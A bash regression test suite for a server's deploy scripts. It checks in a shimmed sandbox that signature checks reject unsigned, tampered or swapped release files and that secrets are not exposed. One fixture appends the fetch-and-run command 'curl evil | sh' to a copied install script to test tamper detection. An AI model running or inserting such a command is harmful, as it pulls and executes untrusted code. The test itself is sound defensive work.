#!/usr/bin/env bash
# Regression tests for server/deploy (install.sh, make-release.sh, compose.yaml, ombra-server.service).
#
#   bash server/deploy/tests/run.sh [deploy-dir]     (default: the deploy dir this script lives in)
#
# Every case runs in a throw-away sandbox; nothing real is installed. OMBRA_ETC / OMBRA_INSTALL_DIR /
# OMBRA_BACKUP_DIR point into the sandbox, the host paths install.sh hard-codes (systemd unit dir, cron dir,
# /usr/local/bin, /var/lib/ombra, /proc uuid) are rewritten into the sandbox, and id, docker, systemctl, apt-get,
# useradd, runuser, chown, curl, sleep, dotnet, cargo, ombra-admin are PATH shims that log to $SB/calls.log.
# Exit code: 0 when every assertion passes.
set -uo pipefail

HERE=$(cd "$(dirname "$0")" && pwd)
DEPLOY=$(cd "${1:-$HERE/..}" && pwd)
for f in install.sh make-release.sh compose.yaml ombra-server.service; do
  [ -f "$DEPLOY/$f" ] || { echo "run.sh: $DEPLOY/$f not found" >&2; exit 2; }
done
for t in openssl comm find awk; do command -v "$t" >/dev/null || { echo "run.sh: $t is required" >&2; exit 2; }; done
WORK=$(cd "$(mktemp -d "${TMPDIR:-/tmp}/ombra-deploy-tests.XXXXXX")" && pwd)  # canonical: install.sh logs pwd-based paths
trap 'rm -rf "$WORK"' EXIT
unset OMBRA_OFFLINE_DIR OMBRA_ETC OMBRA_INSTALL_DIR OMBRA_BACKUP_DIR
if command -v sha256sum >/dev/null; then SHA256=sha256sum; else SHA256="shasum -a 256"; fi
ADDR=203.0.113.5
PASS=0 FAIL=0

check() { # check <description> <command...>
  local desc=$1; shift
  if "$@" >/dev/null 2>&1; then PASS=$((PASS + 1)); echo "ok   - $desc"; else FAIL=$((FAIL + 1)); echo "FAIL - $desc"; fi
}

# ---------- shims ----------
SHIMS=$WORK/shims
mkdir -p "$SHIMS"
shim() { printf '#!/usr/bin/env bash\necho "%s $*" >> "${SHIM_LOG:-/dev/null}"\n%s\n' "$1" "${2:-exit 0}" > "$SHIMS/$1"; chmod 0755 "$SHIMS/$1"; }
shim id 'if [ "${1:-}" = -u ]; then echo 0; fi'
# docker: `load -i F` logs the sha256 of F and whether its directory is 0700; SHIM_SWAP_FROM is overwritten with
# SHIM_SWAP_TO at the first other docker call (an attacker swapping the archive after install.sh checked it);
# compose up/run/create/start/restart with a missing $SHIM_ETC/backup-recipients.txt logs it and creates a directory
# there, as a real bind mount does.
shim docker '
log() { echo "$*" >> "${SHIM_LOG:-/dev/null}"; }
if [ "${1:-}" != load ] && [ -n "${SHIM_SWAP_FROM:-}" ] && [ ! -e "$SHIM_SWAP_FROM.swapped" ]; then
  cp "$SHIM_SWAP_TO" "$SHIM_SWAP_FROM" && : > "$SHIM_SWAP_FROM.swapped"
fi
case "${1:-} ${2:-}" in
  "load -i")
    log "docker-loaded-sha $(sha256sum < "$3" | cut -c1-64) $3"
    if [ -n "$(find "$(dirname "$3")" -prune -perm 0700)" ]; then log "docker-load-dir-0700 $(dirname "$3")"; fi
    echo "Loaded image: ombra-server:test" ;;
  save\ *) while [ $# -gt 0 ]; do if [ "$1" = -o ]; then echo "image" > "$2"; fi; shift; done ;;
esac
if [ "${1:-}" = compose ] && [ -n "${SHIM_ETC:-}" ]; then
  for a in "$@"; do
    case "$a" in up|run|create|start|restart)
      if [ ! -f "$SHIM_ETC/backup-recipients.txt" ]; then
        log "COMPOSE-WITHOUT-RECIPIENTS-FILE $*"; mkdir -p "$SHIM_ETC/backup-recipients.txt"
      fi
      break ;;
    esac
  done
fi
case " $* " in *" bootstrap issue "*) echo "bootstrap code: BOOT-TEST-CODE" ;; esac
exit 0'
shim ombra-admin 'case " $* " in *" bootstrap issue "*) echo "bootstrap code: BOOT-TEST-CODE" ;; esac'
shim curl '[ "${SHIM_HEALTH:-ok}" = ok ] || exit 7'
shim sleep
for s in systemctl apt-get useradd runuser chown; do shim "$s"; done
shim cargo '
td=
while [ $# -gt 0 ]; do if [ "$1" = --target-dir ]; then td=$2; fi; shift; done
[ -n "$td" ] || { echo "cargo shim: --target-dir expected" >&2; exit 1; }
mkdir -p "$td/release" && echo native > "$td/release/libombra_core.so"'
shim dotnet '
out= proj=
for a in "$@"; do case "$a" in *.csproj) proj=$a ;; esac; done
while [ $# -gt 0 ]; do if [ "$1" = -o ]; then out=$2; fi; shift; done
case "$proj" in *Ombra.Server.Cli.csproj) name=ombra-admin ;; *Ombra.Server.csproj) name=Ombra.Server ;; *) exit 1 ;; esac
mkdir -p "$out" && printf "#!/bin/sh\\necho %s\\n" "$name" > "$out/$name" && chmod 0755 "$out/$name" && echo dll > "$out/$name.dll"'
if [ "$(uname -s)" = Darwin ]; then # install.sh uses GNU `sed -i`
  shim sed 'if [ "${1:-}" = -i ]; then shift; exec /usr/bin/sed -i "" "$@"; fi; exec /usr/bin/sed "$@"'
fi
command -v sha256sum >/dev/null || shim sha256sum 'exec shasum -a 256 "$@"'

openssl ecparam -name prime256v1 -genkey -noout -out "$WORK/sign.pem" 2>/dev/null
openssl ec -in "$WORK/sign.pem" -pubout -out "$WORK/sign.pub" 2>/dev/null

# ---------- sandbox ----------
# Rewrites the host paths install.sh hard-codes into sandbox $2 and refuses to run a copy that still touches the host.
relocate_install() {
  local f=$1 h=$2/host
  sed -e "s|/proc/sys/kernel/random/uuid|$h/uuid|g" \
      -e "s|/etc/systemd/system|$h/etc/systemd/system|g" \
      -e "s|/usr/local/bin/ombra-admin|$h/usr/local/bin/ombra-admin|g" \
      -e "s|/etc/cron.daily|$h/etc/cron.daily|g" \
      -e "s|/etc/periodic/daily|$h/etc/periodic/daily|g" \
      -e "s|/var/lib/ombra|$h/var/lib/ombra|g" "$f" > "$f.relocated"
  mv "$f.relocated" "$f" && chmod 0755 "$f"
  if grep -nE '(^|[^A-Za-z0-9_.-])/(proc|usr/local|etc/systemd|etc/cron|etc/periodic|var/lib)/' "$f"; then
    echo "run.sh: $f still references host paths above; extend relocate_install" >&2; exit 2
  fi
}

new_sandbox() { # new_sandbox <name>: sets SB, builds an unsigned release tree in $SB/release
  SB=$WORK/$1
  mkdir -p "$SB/host/etc/systemd/system" "$SB/host/usr/local/bin" "$SB/host/etc/cron.daily" "$SB/host/var/lib"
  echo 6f1d2c3b-0000-4000-8000-00000000c0de > "$SB/host/uuid"
  : > "$SB/calls.log"
  local r=$SB/release
  mkdir -p "$r/deploy" "$r/images" "$r/bin/server" "$r/bin/ombra-admin" "$r/bin/lib"
  cp "$DEPLOY/install.sh" "$DEPLOY/compose.yaml" "$DEPLOY/ombra-server.service" "$r/deploy/"
  relocate_install "$r/deploy/install.sh" "$SB"
  printf '#!/bin/sh\necho server\n' > "$r/bin/server/Ombra.Server"
  printf '#!/bin/sh\necho admin\n' > "$r/bin/ombra-admin/ombra-admin"
  chmod 0755 "$r/bin/server/Ombra.Server" "$r/bin/ombra-admin/ombra-admin"
  echo native > "$r/bin/lib/libombra_core.so"
  echo "signed image" > "$r/images/ombra-server.tar"
  ETC=$SB/etc/ombra OFFLINE=$SB/etc/ombra-offline INST=$SB/opt/ombra
}

sign_release() { # sign_release [top-level dirs listed in SHA256SUMS; default: bin deploy images]
  local dirs=${*:-bin deploy images}
  # shellcheck disable=SC2086
  (cd "$SB/release" && find $dirs -type f | LC_ALL=C sort | xargs $SHA256 > SHA256SUMS)
  openssl dgst -sha256 -sign "$WORK/sign.pem" -out "$SB/release/SHA256SUMS.sig" "$SB/release/SHA256SUMS"
}

run_install() { # run_install <install.sh args...>  →  $SB/rc, $SB/out, $SB/err
  mkdir -p "$SB/tmp"
  (cd "$SB" && env PATH="$SHIMS:$PATH" SHIM_LOG="$SB/calls.log" SHIM_HEALTH="${HEALTH:-ok}" SHIM_ETC="$ETC" \
    SHIM_SWAP_FROM="${SWAP_FROM:-}" SHIM_SWAP_TO="${SWAP_TO:-}" TMPDIR="$SB/tmp" \
    OMBRA_ETC="$ETC" OMBRA_INSTALL_DIR="$INST" OMBRA_BACKUP_DIR="$SB/backups" \
    bash "$SB/release/deploy/install.sh" "$@" > "$SB/out" 2> "$SB/err")
  echo $? > "$SB/rc"
}

KEY="--release-key $WORK/sign.pub"
rc_ok() { [ "$(cat "$SB/rc")" = 0 ]; }
rc_failed() { [ "$(cat "$SB/rc")" != 0 ]; }
logged() { grep -qF -- "$1" "$SB/calls.log"; }
not() { ! "$@"; }
no_bootstrap() { ! grep -q BOOT-TEST-CODE "$SB/out" && ! grep -q 'bootstrap issue' "$SB/calls.log"; }
err_has() { grep -qiF -- "$1" "$SB/err"; }
spki_hex() { openssl pkey -in "$1" -pubout -outform DER | openssl dgst -sha256 -binary | od -An -tx1 | tr -d ' \n'; }
mode_is() { [ -n "$(find "$2" -prune -perm "$1")" ]; }
no_next_key_under_etc() { [ -d "$ETC" ] && [ -z "$(find "$ETC" -name 'next.key*')" ]; }
next_key_offline() {
  local k=$OFFLINE/next.key
  [ -f "$k" ] && mode_is 0600 "$k" && mode_is 0700 "$OFFLINE" \
    && grep -q "TLS pin (next): *$(spki_hex "$k")\$" "$SB/out"
}
etc_not_chowned_recursively() { ! grep -E "^chown -R (1654|ombra)[^ ]* .*$ETC( |/|\$)" "$SB/calls.log"; }
offline_not_chowned_to_app() { ! grep -E "^chown (-R )?(1654|ombra)[^ ]* .*(ombra-offline|next\.key)" "$SB/calls.log"; }
secrets_not_chowned_to_app() { ! grep -E "^chown (-R )?(1654|ombra)[^ ]* .*(db_password|/tls/next)" "$SB/calls.log"; }
app_reads_only() { # app_reads_only <owner>: the files the server reads are chowned to it individually
  local f
  for f in token.key server-id tls/current.crt tls/current.key backup-recipients.txt; do
    grep -qE "^chown $1:$1 $ETC/$f\$" "$SB/calls.log" || return 1
  done
}
compose_mounts_sources_exist() { # every /etc/ombra bind source of the installed compose.yaml exists after install
  local src
  for src in $(sed -n 's|^ *- *"\{0,1\}/etc/ombra/\([^:]*\):.*|\1|p' "$INST/compose.yaml"); do
    [ "$src" = Caddyfile ] && [ ! -e "$ETC/domain" ] && continue
    [ -e "$ETC/$src" ] || return 1
  done
}
signed_image_sha() { $SHA256 < "$SB/release/images/ombra-server.tar" | cut -c1-64; }
loaded_only_signed_image() { # at least one docker load, and every loaded file had the signed hash
  local s; s=$(signed_image_sha)
  grep -q "^docker-loaded-sha $s " "$SB/calls.log" && ! grep '^docker-loaded-sha ' "$SB/calls.log" | grep -qv "^docker-loaded-sha $s "
}
loaded_private_copy() { # loaded_private_copy <original>: docker loaded a copy in a 0700 dir (since removed), not the original
  local dir
  dir=$(sed -n 's/^docker-load-dir-0700 //p' "$SB/calls.log" | tail -1)
  [ -n "$dir" ] && ! logged "load -i $1" && [ ! -e "$dir" ] && grep -q "^docker load -i $dir/" "$SB/calls.log"
}
recipients_is_file() { [ -f "$ETC/backup-recipients.txt" ] && [ ! -L "$ETC/backup-recipients.txt" ]; }
no_whole_etc_mount() { ! grep -E '^ *- *"?/etc/ombra/?(:|")' "$1"; }
etc_mounts_read_only() { ! grep -E '^ *- *"?/etc/ombra' "$1" | grep -vE ':ro"?( |$)'; }

echo "# deploy dir under test: $DEPLOY"

# ======================================================================
echo "# finding 1 (P1 OMBRA-DEPLOY-UNSIGNED-BIN): every installed file is covered by the signed SHA256SUMS"
new_sandbox f1-docker-ok; sign_release
run_install --ip "$ADDR" $KEY --backup-recipient age1test
check "F1 fully signed release installs (Docker, IP)" rc_ok
check "F1 Docker install prints a bootstrap code" grep -q BOOT-TEST-CODE "$SB/out"
F3_DOCKER=$SB

new_sandbox f1-systemd-ok; sign_release
run_install --systemd --ip "$ADDR" $KEY
check "F1 fully signed release installs (systemd), bin/ copied" eval 'rc_ok && [ -x "$INST/bin/server/Ombra.Server" ]'
F3_SYSTEMD=$SB

new_sandbox f1-bin-unlisted; sign_release deploy images   # what the old make-release.sh produced
run_install --systemd --ip "$ADDR" $KEY
check "F1 systemd: bin/ not listed in SHA256SUMS → rejected" rc_failed
check "F1 systemd: unlisted bin/ is not copied to the install dir" not test -e "$INST/bin"

new_sandbox f1-bin-extra; sign_release
echo evil > "$SB/release/bin/lib/libevil.so"
run_install --systemd --ip "$ADDR" $KEY
check "F1 systemd: extra unlisted file in bin/ → rejected" eval 'rc_failed && [ ! -e "$INST/bin" ]'
check "F1 rejection names the unlisted file" err_has "bin/lib/libevil.so"

new_sandbox f1-symlink; sign_release
ln -s /bin/sh "$SB/release/bin/server/createdump"
run_install --systemd --ip "$ADDR" $KEY
check "F1 systemd: symlink in the release tree → rejected" eval 'rc_failed && [ ! -e "$INST/bin" ]'

new_sandbox f1-tampered; sign_release
echo tampered >> "$SB/release/bin/server/Ombra.Server"
run_install --systemd --ip "$ADDR" $KEY
check "F1 systemd: listed file modified after signing → rejected" rc_failed

new_sandbox f1-archive-outside; sign_release
echo evil > "$SB/evil.tar"
run_install --ip "$ADDR" $KEY --image-archive "$SB/evil.tar"
check "F1 Docker: --image-archive outside the release, not in SHA256SUMS → rejected" rc_failed
check "F1 Docker: the unsigned archive is never docker-loaded" not logged "load -i"
check "F1 Docker: rejected before anything is written to OMBRA_ETC" not test -e "$ETC/server.env"

new_sandbox f1-archive-unlisted-in-tree; sign_release
echo evil > "$SB/release/images/other.tar"
run_install --ip "$ADDR" $KEY --image-archive "$SB/release/images/other.tar"
check "F1 Docker: unlisted archive inside images/ → rejected, not loaded" eval 'rc_failed && ! logged "load -i"'

new_sandbox f1-archive-copy; sign_release
cp "$SB/release/images/ombra-server.tar" "$SB/copy.tar"
run_install --ip "$ADDR" $KEY --image-archive "$SB/copy.tar"
check "F1 Docker: --image-archive byte-identical to the signed image → accepted" eval 'rc_ok && loaded_only_signed_image'

new_sandbox f1-upgrade; sign_release
run_install --ip "$ADDR" $KEY --backup-recipient age1test
check "F1 upgrade fixture: fresh install OK" rc_ok
echo evil > "$SB/evil.tar"; : > "$SB/calls.log"
run_install --upgrade $KEY --image-archive "$SB/evil.tar"
check "F1 upgrade: --image-archive not in SHA256SUMS → rejected" rc_failed
check "F1 upgrade: the unsigned archive is never docker-loaded" not logged "load -i"
check "F1 upgrade: rejected before backup/tag/compose changes" not logged "docker "
: > "$SB/calls.log"
run_install --upgrade $KEY
check "F1 upgrade with the signed image succeeds" eval 'rc_ok && loaded_only_signed_image'

# make-release.sh with shimmed docker/cargo/dotnet; its output must install with --systemd.
new_sandbox f1-make-release; rm -rf "$SB/release"
mkdir -p "$SB/src/deploy"
cp "$DEPLOY/install.sh" "$DEPLOY/make-release.sh" "$DEPLOY/compose.yaml" "$DEPLOY/ombra-server.service" "$SB/src/deploy/"
relocate_install "$SB/src/deploy/install.sh" "$SB"
(cd "$SB" && env PATH="$SHIMS:$PATH" SHIM_LOG="$SB/calls.log" \
  bash "$SB/src/deploy/make-release.sh" 1.0.0 "$SB/release" "$WORK/sign.pem" > "$SB/mr.out" 2> "$SB/mr.err")
check "F1 make-release.sh succeeds" test $? = 0
for f in bin/server/Ombra.Server bin/ombra-admin/ombra-admin bin/lib/libombra_core.so deploy/install.sh images/ombra-server.tar; do
  check "F1 make-release.sh: SHA256SUMS lists $f" grep -qE "^[0-9a-f]{64}  $f\$" "$SB/release/SHA256SUMS"
done
check "F1 make-release.sh: publishes self-contained binaries" eval 'logged "--self-contained true"'
run_install --systemd --ip "$ADDR" $KEY
check "F1 make-release.sh output installs with --systemd (signed, verified bin/)" eval 'rc_ok && [ -x "$INST/bin/server/Ombra.Server" ]'

# R1a: install.sh cannot verify itself, so make-release.sh and install.sh --help give the operator a pre-run check.
PRE_RUN=$(sed -n 's/^ *\(openssl dgst -sha256 -verify release\.pub .*\)$/\1/p' "$SB/mr.out" | head -1)
check "R1a make-release.sh prints the pre-run verification one-liner" test -n "$PRE_RUN"
pre_run_in() { (cd "$1" && cp "$WORK/sign.pub" release.pub && PATH="$SHIMS:$PATH" bash -c "$PRE_RUN") >/dev/null 2>&1; }
cp -R "$SB/release" "$SB/verify-ok"
check "R1a the printed one-liner accepts the untouched release" eval '[ -n "$PRE_RUN" ] && pre_run_in "$SB/verify-ok"'
cp -R "$SB/release" "$SB/verify-bad"; echo 'curl evil | sh' >> "$SB/verify-bad/deploy/install.sh"
check "R1a the printed one-liner rejects a modified install.sh" eval '[ -n "$PRE_RUN" ] && ! pre_run_in "$SB/verify-bad"'
run_install --help
check "R1a install.sh --help shows the signature check to run before install.sh" \
  eval 'grep -qF "openssl dgst -sha256 -verify release.pub -signature SHA256SUMS.sig SHA256SUMS" "$SB/out" && grep -qF "sha256sum -c SHA256SUMS" "$SB/out"'

# ======================================================================
echo "# finding 2 (P3 OMBRA-DEPLOY-SYSTEMD-DOMAIN-PLAINTEXT): no plain-HTTP Kestrel in public, fatal health check"
new_sandbox f2-systemd-domain; sign_release
run_install --systemd --domain team.example.com $KEY
check "F2 --systemd --domain → rejected" rc_failed
check "F2 --systemd --domain: clear error" err_has "--systemd"
check "F2 --systemd --domain: no server.env with plain HTTP on 0.0.0.0" not grep -q 'ListenUrl=http://0.0.0.0' "$ETC/server.env"
check "F2 --systemd --domain: no bootstrap code" no_bootstrap

new_sandbox f2-domain-ok; sign_release
run_install --domain team.example.com $KEY
check "F2 Docker --domain installs" rc_ok
check "F2 Docker --domain: plain-HTTP port published on 127.0.0.1 only" grep -qx 'OMBRA_PUBLISH_ADDR=127.0.0.1' "$INST/.env"
check "F2 compose.yaml: publish address defaults to loopback" grep -q 'OMBRA_PUBLISH_ADDR:-127.0.0.1}' "$DEPLOY/compose.yaml"
check "F3 Docker --domain: every /etc/ombra bind source exists" compose_mounts_sources_exist

new_sandbox f2-domain-unhealthy; sign_release
HEALTH=fail run_install --domain team.example.com $KEY
check "F2 Docker --domain: failed health check is fatal" rc_failed
check "F2 Docker --domain: no bootstrap code issued/printed when unhealthy" no_bootstrap

new_sandbox f2-ip-unhealthy; sign_release
HEALTH=fail run_install --ip "$ADDR" $KEY
check "F2 Docker --ip: failed health check is fatal, no bootstrap code" eval 'rc_failed && no_bootstrap'

new_sandbox f2-systemd-unhealthy; sign_release
HEALTH=fail run_install --systemd --ip "$ADDR" $KEY
check "F2 systemd --ip: failed health check is fatal, no bootstrap code" eval 'rc_failed && no_bootstrap'

# ======================================================================
echo "# finding 3 (P3 OMBRA-DEPLOY-SECRETS-MOUNT): offline next key out of reach, minimal read-only mounts"
SB=$F3_DOCKER ETC=$SB/etc/ombra OFFLINE=$SB/etc/ombra-offline INST=$SB/opt/ombra
check "F3 Docker: no next.key anywhere under OMBRA_ETC" no_next_key_under_etc
check "F3 Docker: next.key root-only (0600, dir 0700) outside OMBRA_ETC, matches printed next pin" next_key_offline
check "F3 Docker: next.key / offline dir never chowned to the app" offline_not_chowned_to_app
check "F3 Docker: OMBRA_ETC not chowned recursively to uid 1654" etc_not_chowned_recursively
check "F3 Docker: db_password not chowned to uid 1654" secrets_not_chowned_to_app
check "F3 Docker: server-read files chowned to uid 1654 one by one" app_reads_only 1654
check "F3 compose.yaml: /etc/ombra is not mounted as a whole" no_whole_etc_mount "$INST/compose.yaml"
check "F3 compose.yaml: every /etc/ombra bind mount is read-only" etc_mounts_read_only "$INST/compose.yaml"
check "F3 Docker --ip: every /etc/ombra bind source exists" compose_mounts_sources_exist

SB=$F3_SYSTEMD ETC=$SB/etc/ombra OFFLINE=$SB/etc/ombra-offline INST=$SB/opt/ombra
check "F3 systemd: no next.key anywhere under OMBRA_ETC" no_next_key_under_etc
check "F3 systemd: next.key root-only outside OMBRA_ETC, matches printed next pin" next_key_offline
check "F3 systemd: OMBRA_ETC not chowned recursively to ombra" etc_not_chowned_recursively
check "F3 systemd: next.key / offline dir never chowned to ombra" offline_not_chowned_to_app
check "F3 systemd: server-read files chowned to ombra one by one" app_reads_only ombra
check "F3 ombra-server.service: /etc/ombra is not writable by the service" not grep -qE '^ReadWritePaths=.*/etc/ombra' "$DEPLOY/ombra-server.service"
check "F3 ombra-server.service: offline key dir is inaccessible" grep -qE '^InaccessiblePaths=.*/etc/ombra-offline' "$DEPLOY/ombra-server.service"

new_sandbox f3-upgrade; sign_release
run_install --ip "$ADDR" $KEY --backup-recipient age1test
check "F3 upgrade fixture: fresh install OK" rc_ok
# layout left by earlier releases: the offline key inside OMBRA_ETC/tls
if [ -f "$OFFLINE/next.key" ]; then mv "$OFFLINE/next.key" "$ETC/tls/next.key"; fi
cp "$ETC/tls/next.key" "$SB/next.key.orig"
run_install --upgrade $KEY
check "F3 upgrade succeeds" rc_ok
check "F3 upgrade: leftover tls/next.key moved out of OMBRA_ETC" no_next_key_under_etc
check "F3 upgrade: the key is kept in the offline dir" cmp -s "$SB/next.key.orig" "$OFFLINE/next.key"
check "F3 upgrade: OMBRA_ETC not chowned recursively to uid 1654" etc_not_chowned_recursively

# ======================================================================
echo "# re-review R1b (TOCTOU --image-archive): the verified private copy is what docker loads"
new_sandbox r1b-fresh; sign_release
run_install --ip "$ADDR" $KEY
check "R1b fresh install loads a copy from a 0700 temp dir (removed afterwards), not images/ombra-server.tar" \
  loaded_private_copy "$SB/release/images/ombra-server.tar"
check "R1b fresh install: the loaded file has the signed hash" loaded_only_signed_image

new_sandbox r1b-swap-fresh; sign_release
cp "$SB/release/images/ombra-server.tar" "$SB/copy.tar"; echo evil > "$SB/evil.tar"
SWAP_FROM=$SB/copy.tar SWAP_TO=$SB/evil.tar run_install --ip "$ADDR" $KEY --image-archive "$SB/copy.tar"
check "R1b fresh: --image-archive swapped after the check → docker still loads only the signed bytes" \
  eval 'cmp -s "$SB/copy.tar" "$SB/evil.tar" && loaded_only_signed_image'
check "R1b fresh: the original --image-archive path is never passed to docker load" \
  loaded_private_copy "$SB/copy.tar"

new_sandbox r1b-swap-upgrade; sign_release
run_install --ip "$ADDR" $KEY --backup-recipient age1test
check "R1b upgrade fixture: fresh install OK" rc_ok
cp "$SB/release/images/ombra-server.tar" "$SB/copy.tar"; echo evil > "$SB/evil.tar"; : > "$SB/calls.log"
SWAP_FROM=$SB/copy.tar SWAP_TO=$SB/evil.tar run_install --upgrade $KEY --image-archive "$SB/copy.tar"
check "R1b upgrade: --image-archive swapped after the check → docker still loads only the signed bytes" \
  eval 'rc_ok && cmp -s "$SB/copy.tar" "$SB/evil.tar" && loaded_only_signed_image'
check "R1b upgrade: loads a private 0700 copy (removed afterwards), not the original" loaded_private_copy "$SB/copy.tar"

# ======================================================================
echo "# re-review R2: backup-recipients.txt never becomes a directory through the compose bind mount"
new_sandbox r2-upgrade-missing; sign_release
run_install --ip "$ADDR" $KEY --backup-recipient age1test
check "R2 fixture: fresh install OK, compose never started without the file" \
  eval 'rc_ok && ! logged COMPOSE-WITHOUT-RECIPIENTS-FILE'
rm -f "$ETC/backup-recipients.txt"; : > "$SB/calls.log"
run_install --upgrade $KEY --backup-recipient age1new
check "R2 upgrade with the file deleted (+ --backup-recipient) succeeds" rc_ok
check "R2 upgrade: compose never started while the file was missing" not logged COMPOSE-WITHOUT-RECIPIENTS-FILE
check "R2 upgrade: backup-recipients.txt is a regular file holding the recipient" \
  eval 'recipients_is_file && grep -qx age1new "$ETC/backup-recipients.txt"'

new_sandbox r2-upgrade-missing-norecipient; sign_release
run_install --ip "$ADDR" $KEY
check "R2 fixture (no recipient): fresh install OK" rc_ok
rm -f "$ETC/backup-recipients.txt"; : > "$SB/calls.log"
run_install --upgrade $KEY
check "R2 upgrade without any recipient fails (no backup possible)" rc_failed
check "R2 upgrade without recipient: compose never started while the file was missing" not logged COMPOSE-WITHOUT-RECIPIENTS-FILE
check "R2 upgrade without recipient: backup-recipients.txt left as a regular file" recipients_is_file

new_sandbox r2-upgrade-dir; sign_release
run_install --ip "$ADDR" $KEY --backup-recipient age1test
check "R2 fixture (dir): fresh install OK" rc_ok
rm -f "$ETC/backup-recipients.txt"; mkdir "$ETC/backup-recipients.txt"; : > "$SB/calls.log"   # left by an earlier bind mount
run_install --upgrade $KEY --backup-recipient age1new
check "R2 upgrade: an empty directory left by a bind mount is replaced by the regular file" \
  eval 'rc_ok && recipients_is_file && ! logged COMPOSE-WITHOUT-RECIPIENTS-FILE'

echo "# passed: $PASS, failed: $FAIL"
[ "$FAIL" = 0 ]
